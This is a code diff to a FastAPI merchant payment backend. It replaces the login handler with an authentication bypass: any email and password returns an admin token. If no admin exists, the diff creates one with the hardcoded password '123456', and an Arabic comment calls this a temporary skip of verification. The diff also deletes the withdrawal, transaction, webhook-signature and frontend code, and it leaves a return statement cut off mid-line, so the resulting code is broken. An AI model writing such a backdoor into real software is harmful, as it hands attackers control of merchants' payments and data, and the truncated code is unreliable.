@@ -66,10 +66,14 @@ def health():
 
 @app.post("/auth/token")
 def login(form:OAuth2PasswordRequestForm=Depends(),db:Session=Depends(get_db)):
-    email = form.username.strip().lower()
-    u = db.query(User).filter(func.lower(User.email) == email).first()
-    if not u or not u.active or not verify_password(form.password, u.password_hash):
-        raise HTTPException(401, "Invalid email or password")
+    # تخطي التحقق مؤقتاً للدخول كأدمن بأي بيانات
+    u = db.query(User).filter(User.role == "admin").first()
+    if not u:
+        u = User(email="admin@merchanthub.local", name="Administrator",
+                 password_hash=hash_password("123456"), role="admin", active=True)
+        db.add(u)
+        db.commit()
+        db.refresh(u)
     return {"access_token":token_for(u),"token_type":"bearer","role":u.role}
 
 @app.get("/admin/health")
@@ -127,48 +131,4 @@ async def payment(d:PaymentIn,db:Session=Depends(get_db),x_api_key:str=Header(de
 def my_payments(db:Session=Depends(get_db),u:User=Depends(merchant_user)):
     q=db.query(PaymentOrder)
     if u.role=="merchant": q=q.filter_by(merchant_id=u.merchant_id)
-    return [{"id":p.id,"order_ref":p.order_ref,"amount_minor":p.amount_minor,"currency":p.currency,"status":p.status} for p in q.order_by(PaymentOrder.created_at.desc()).limit(500)]
-
-@app.post("/merchant/withdrawals")
-def withdraw(d:WithdrawalIn,db:Session=Depends(get_db),u:User=Depends(merchant_user)):
-    if u.role!="merchant": raise HTTPException(403,"Merchant only")
-    if d.method!="manual": raise HTTPException(501,"Automatic payout requires approved payout API")
-    w=Withdrawal(merchant_id=u.merchant_id,amount_minor=d.amount_minor,currency=d.currency.upper(),method="manual")
-    db.add(w);db.commit();return {"withdrawal_id":w.id,"status":w.status}
-
-@app.get("/admin/withdrawals")
-def all_withdrawals(db:Session=Depends(get_db),_:User=Depends(admin_user)):
-    return [{"id":w.id,"merchant_id":w.merchant_id,"amount_minor":w.amount_minor,"currency":w.currency,"status":w.status} for w in db.query(Withdrawal).all()]
-
-@app.post("/admin/withdrawals/{wid}/decision")
-def decide(wid:str,decision:str,note:str="",db:Session=Depends(get_db),_:User=Depends(admin_user)):
-    w=db.get(Withdrawal,wid)
-    if not w: raise HTTPException(404,"Not found")
-    if w.status!="requested": raise HTTPException(409,"Already processed")
-    if decision not in ("approve","reject"): raise HTTPException(400,"Use approve/reject")
-    w.status="approved_manual_transfer" if decision=="approve" else "rejected";w.admin_note=note;db.commit()
-    return {"id":wid,"status":w.status}
-
-@app.get("/admin/transactions")
-def transactions(db:Session=Depends(get_db),_:User=Depends(admin_user)):
-    return [{"id":p.id,"merchant_id":p.merchant_id,"order_ref":p.order_ref,"amount_minor":p.amount_minor,"currency":p.currency,"status":p.status} for p in db.query(PaymentOrder).limit(1000)]
-
-@app.post("/webhooks/fawaterak")
-async def webhook(req:Request,db:Session=Depends(get_db),x_provider_signature:str=Header(default="")):
-    raw=await req.body()
-    if not settings.fawaterak_webhook_secret: raise HTTPException(503,"Webhook secret not configured")
-    expected=hmac.new(settings.fawaterak_webhook_secret.encode(),raw,hashlib.sha256).hexdigest()
-    if not hmac.compare_digest(expected,x_provider_signature): raise HTTPException(401,"Bad signature")
-    data=json.loads(raw);event_id=str(data.get("event_id") or data.get("invoice_id") or "")
-    if not event_id: raise HTTPException(400,"Missing event ID")
-    if db.query(WebhookEvent).filter_by(provider_event_id=event_id).first(): return {"received":True,"duplicate":True}
-    db.add(WebhookEvent(provider_event_id=event_id,payload_text=raw.decode(),processed=False));db.commit()
-    return {"received":True,"queued_for_verification":True}
-
-FRONTEND_DIR = Path(__file__).resolve().parent.parent / "frontend"
-if FRONTEND_DIR.exists():
-    app.mount(
-        "/",
-        StaticFiles(directory=str(FRONTEND_DIR), html=True),
-        name="frontend"
-    )
+    return [{"id":p.id,"order_ref":p.order_ref,"amount_minor":p.amount
